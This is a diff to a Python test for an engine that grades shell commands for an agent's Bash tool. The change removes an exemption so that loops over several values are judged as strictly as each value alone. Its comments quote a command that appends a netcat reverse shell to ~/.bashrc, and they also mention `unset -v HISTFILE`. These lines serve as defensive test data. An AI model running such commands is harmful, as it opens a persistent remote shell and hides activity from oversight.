@@ -2014,10 +2014,11 @@ class TimedAndBraced(unittest.TestCase):
         this measures it over the shell corpus on both engines, with each value also swapped for one whose digits
         differ and with the scheme dropped. The control is the loosest reduction there is -- a loop's first value
         standing for all of them -- which this corpus has to catch; without that the assertion below would hold on
-        an empty corpus and prove nothing. One shape is counted rather than exempted: a value reached through a
-        variable holding more than one of them loses a rule that reads the path itself (`echo 'nc -e /bin/sh
-        192.0.2.7 4444' >> ~/.bashrc` is an ask by TK-A078; the same body over a two-value loop is a flag), so a
-        row may read looser only while each value alone still reads exactly as the path written in."""
+        an empty corpus and prove nothing. No row is exempted. The shape that first had to be counted -- a value
+        reached through a variable holding more than one of them lost the rule that reads the path itself, so
+        `echo 'nc -e /bin/sh 192.0.2.7 4444' >> ~/.bashrc` (an ask by TK-A078) read a flag through a two-value
+        loop -- is held to the same floor as every other row now that 1.7.0 decides a loop per value, which is what
+        makes this a guard on that fix rather than a count of what it left."""
         rank = ("allow", "flag", "ask", "deny").index
 
         def looped(words, at, values):
@@ -2052,7 +2053,7 @@ class TimedAndBraced(unittest.TestCase):
             d = e.decide("Bash", {"command": line})
             return d["verdict"], set(d["rule_ids"])
 
-        checked = caught = loose = 0
+        checked = caught = 0
         for backend in BACKENDS:
             e = Engine(pc.build(os.path.join(PACKS, "dev.yaml"))[0], backend)
             for note, words, at, values in corpus():
@@ -2060,26 +2061,15 @@ class TimedAndBraced(unittest.TestCase):
                 singles = [verdict(e, looped(words, at, (v,))) for v in values]
                 strictest = max(rank(s[0]) for s in singles)
                 with self.subTest(backend=backend, note=note, values=values):
-                    if rank(whole[0]) < strictest:
-                        # Counted, not exempted, and only while the cause is the variable: a value read on its own
-                        # must still decide exactly as that value written into the line. Written in, appending a
-                        # network shell to a login file is an ask (TK-A078); so is a loop holding that one value; a
-                        # loop holding two is a flag, and the bare `>> "$tkv"` is allowed outright. A row that reads
-                        # looser with a single value too is a different defect, and fails here.
-                        literal = verdict(e, " ".join(words[:at] + [values[0]] + words[at + 1:]))
-                        self.assertEqual([rank(s[0]) for s in singles], [rank(literal[0])] * len(singles),
-                                         (note, values, [s[0] for s in singles], literal))
-                        loose += 1
-                    else:
-                        self.assertGreaterEqual(rank(whole[0]), strictest, (note, values, whole[0],
-                                                                           [s[0] for s in singles]))
-                        # A line the parser cannot read is held for a person on this pack (ask, TK-SHELL-PARSE),
-                        # which is never looser than a value it holds and is how main already reads what it can't
-                        # parse, so only a line it did read has to carry the ids its values raise (`unset -v
-                        # HISTFILE` with a two-value loop is one the parser gives up on, and its ask stands).
-                        if "TK-SHELL-PARSE" not in whole[1]:
-                            self.assertLessEqual(set().union(*(s[1] for s in singles)), whole[1],
-                                                 (note, values, whole[1], [s[1] for s in singles]))
+                    self.assertGreaterEqual(rank(whole[0]), strictest, (note, values, whole[0],
+                                                                       [s[0] for s in singles]))
+                    # A line the parser cannot read is held for a person on this pack (ask, TK-SHELL-PARSE),
+                    # which is never looser than a value it holds and is how main already reads what it can't
+                    # parse, so only a line it did read has to carry the ids its values raise (`unset -v
+                    # HISTFILE` with a two-value loop is one the parser gives up on, and its ask stands).
+                    if "TK-SHELL-PARSE" not in whole[1]:
+                        self.assertLessEqual(set().union(*(s[1] for s in singles)), whole[1],
+                                             (note, values, whole[1], [s[1] for s in singles]))
                 checked += 1
                 if rank(verdict(e, looped(words, at, values[:1]))[0]) < strictest:
                     caught += 1
@@ -2095,7 +2085,6 @@ class TimedAndBraced(unittest.TestCase):
                         self.assertIn("TK-S001", d["rule_ids"], (backend, pack, line, d["verdict"]))
                         self.assertEqual(d["verdict"], "deny", (backend, pack, line))
         self.assertGreater(checked, 500, "the corpus walk stopped early")
-        self.assertLess(loose, checked / 10, "looser readings now cover more than a tenth of the corpus")
 
     def test_brace_expansion_in_an_argument_makes_the_words_bash_makes(self):
         for line, words in (
